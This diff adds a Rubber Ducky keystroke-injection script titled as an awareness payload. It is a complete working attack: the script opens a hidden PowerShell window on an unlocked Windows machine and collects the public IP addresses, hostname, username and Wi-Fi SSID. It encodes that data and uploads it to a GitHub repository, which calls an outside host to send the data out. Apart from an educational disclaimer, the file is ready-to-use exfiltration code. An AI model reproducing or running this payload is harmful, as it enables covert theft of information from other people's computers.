@@ -1,0 +1,82 @@
+REM --------------------------------------------
+REM Payload Title: Awareness Payload - System Info Grabber
+REM Author:Dakhari Shorter (VemTech6)
+REM Description: This Rubber Ducky script demonstrates how quickly 
+REM              system and network information can be exfiltrated 
+REM              from an unlocked Windows machine. It collects 
+REM              IPv4, IPv6, hostname, username, and Wi-Fi SSID, 
+REM              encodes the data, and uploads it to a GitHub repo.
+REM Disclaimer: FOR EDUCATIONAL AND AWARENESS PURPOSES ONLY.
+REM              Do NOT use this script on machines you do not own 
+REM              or have explicit permission to test.
+REM --------------------------------------------
+
+REM Begin Payload
+DELAY 200 
+GUI r 
+DELAY 200 
+STRING powershell -WindowStyle hidden
+ENTER
+DELAY 300
+
+REM Collect Public IP Address
+STRING $ipv4 = Invoke-RestMethod -Uri "http://ipv4.icanhazip.com";
+ENTER
+STRING $ipv6 = Invoke-RestMethod -Uri "http://ifconfig.me/ip";
+ENTER
+
+REM Collect System Information
+STRING $hostname = hostname;
+ENTER
+STRING $username = $env:USERNAME;
+ENTER
+STRING $wifi = (netsh wlan show interfaces | Select-String SSID | Select-Object -First 1).ToString().Trim();
+ENTER
+
+REM Convert to Base64
+STRING $log = "IPv4: $ipv4`nIPv6: $ipv6`nHostname: $hostname`nUsername: $username`nSSID: $wifi";
+ENTER
+STRING $bytes = [System.Text.Encoding]::UTF8.GetBytes($log);
+ENTER
+STRING $encoded = [Convert]::ToBase64String($bytes);
+ENTER
+
+REM GitHub token and headers
+STRING $token = 'YOUR_GITHUB_TOKEN_HERE';
+ENTER
+STRING $headers = @{ Authorization = "token $token" };
+ENTER
+
+REM Format commit body
+STRING $body = @{
+ENTER
+STRING  message = "Upload IP log";
+ENTER
+STRING  content = $encoded;
+ENTER
+STRING  committer = @{
+ENTER
+STRING    name = "AutoLogger";
+ENTER
+STRING    email = "you@example.com"
+ENTER
+STRING  }
+ENTER
+STRING } | ConvertTo-Json -Depth 3;
+ENTER
+
+REM Generate dynamic filename with timestamp
+STRING $timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss";
+ENTER
+STRING $filename = "iplog-$timestamp.txt";
+ENTER
+
+REM Set URI
+STRING $uri = "https://api.github.com/repos/YOUR_USERNAME/YOUR_REPO/contents/" + $filename;
+ENTER
+
+REM Upload to GitHub
+STRING Invoke-RestMethod -Uri $uri -Method PUT -Headers $headers -Body $body;
+ENTER
+
+REM --- End Payload ---
